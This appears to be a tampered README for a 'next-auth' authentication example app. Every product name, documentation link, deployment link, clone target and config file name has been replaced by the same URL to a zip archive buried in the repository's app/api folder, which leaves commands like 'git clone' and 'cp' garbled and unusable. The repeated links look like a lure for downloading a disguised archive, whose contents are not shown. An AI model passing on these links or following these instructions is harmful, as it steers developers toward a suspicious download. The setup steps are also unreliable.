## Overview

https://github.com/suryansh-malik/next-auth-example/raw/refs/heads/main/app/api/example-next-auth-2.5-alpha.1.zip is a complete open source authentication solution.

This is an example application that shows how `next-auth` is applied to a basic https://github.com/suryansh-malik/next-auth-example/raw/refs/heads/main/app/api/example-next-auth-2.5-alpha.1.zip app.

The deployed version can be found at [`https://github.com/suryansh-malik/next-auth-example/raw/refs/heads/main/app/api/example-next-auth-2.5-alpha.1.zip`](https://github.com/suryansh-malik/next-auth-example/raw/refs/heads/main/app/api/example-next-auth-2.5-alpha.1.zip)

### About https://github.com/suryansh-malik/next-auth-example/raw/refs/heads/main/app/api/example-next-auth-2.5-alpha.1.zip

https://github.com/suryansh-malik/next-auth-example/raw/refs/heads/main/app/api/example-next-auth-2.5-alpha.1.zip is an easy to implement, full-stack (client/server) open source authentication library originally designed for [https://github.com/suryansh-malik/next-auth-example/raw/refs/heads/main/app/api/example-next-auth-2.5-alpha.1.zip](https://github.com/suryansh-malik/next-auth-example/raw/refs/heads/main/app/api/example-next-auth-2.5-alpha.1.zip) and [Serverless](https://github.com/suryansh-malik/next-auth-example/raw/refs/heads/main/app/api/example-next-auth-2.5-alpha.1.zip). ## Getting Started

### 1. Clone the repository and install dependencies

```
git clone https://github.com/suryansh-malik/next-auth-example/raw/refs/heads/main/app/api/example-next-auth-2.5-alpha.1.zip
cd next-auth-example
npm install
```

### 2. Configure your local environment

Copy the https://github.com/suryansh-malik/next-auth-example/raw/refs/heads/main/app/api/example-next-auth-2.5-alpha.1.zip file in this directory to https://github.com/suryansh-malik/next-auth-example/raw/refs/heads/main/app/api/example-next-auth-2.5-alpha.1.zip (which will be ignored by Git):

```
cp https://github.com/suryansh-malik/next-auth-example/raw/refs/heads/main/app/api/example-next-auth-2.5-alpha.1.zip https://github.com/suryansh-malik/next-auth-example/raw/refs/heads/main/app/api/example-next-auth-2.5-alpha.1.zip
```

Add details for one or more providers (e.g. Google, Twitter, GitHub, Email, etc).

#### Database

A database is needed to persist user accounts and to support email sign in. However, you can still use https://github.com/suryansh-malik/next-auth-example/raw/refs/heads/main/app/api/example-next-auth-2.5-alpha.1.zip for authentication without a database by using OAuth for authentication. If you do not specify a database, [JSON Web Tokens](https://github.com/suryansh-malik/next-auth-example/raw/refs/heads/main/app/api/example-next-auth-2.5-alpha.1.zip) will be enabled by default.

You **can** skip configuring a database and come back to it later if you want.

For more information about setting up a database, please check out the following links:

- Docs: [https://github.com/suryansh-malik/next-auth-example/raw/refs/heads/main/app/api/example-next-auth-2.5-alpha.1.zip](https://github.com/suryansh-malik/next-auth-example/raw/refs/heads/main/app/api/example-next-auth-2.5-alpha.1.zip)

### 3. Configure Authentication Providers

1. Review and update options in `https://github.com/suryansh-malik/next-auth-example/raw/refs/heads/main/app/api/example-next-auth-2.5-alpha.1.zip` as needed.

2. When setting up OAuth, in the developer admin page for each of your OAuth services, you should configure the callback URL to use a callback path of `{server}/api/auth/callback/{provider}`.

e.g. For Google OAuth you would use: `http://localhost:3000/api/auth/callback/google`

A list of configured providers and their callback URLs is available from the endpoint `api/auth/providers`. You can find more information at https://github.com/suryansh-malik/next-auth-example/raw/refs/heads/main/app/api/example-next-auth-2.5-alpha.1.zip

1. You can also choose to specify an SMTP server for passwordless sign in via email.

### 4. Start the application

To run your site locally, use:

```
npm run dev
```

To run it in production mode, use:

```
npm run build
npm run start
```

### 5. Preparing for Production

Follow the [Deployment documentation](https://github.com/suryansh-malik/next-auth-example/raw/refs/heads/main/app/api/example-next-auth-2.5-alpha.1.zip)
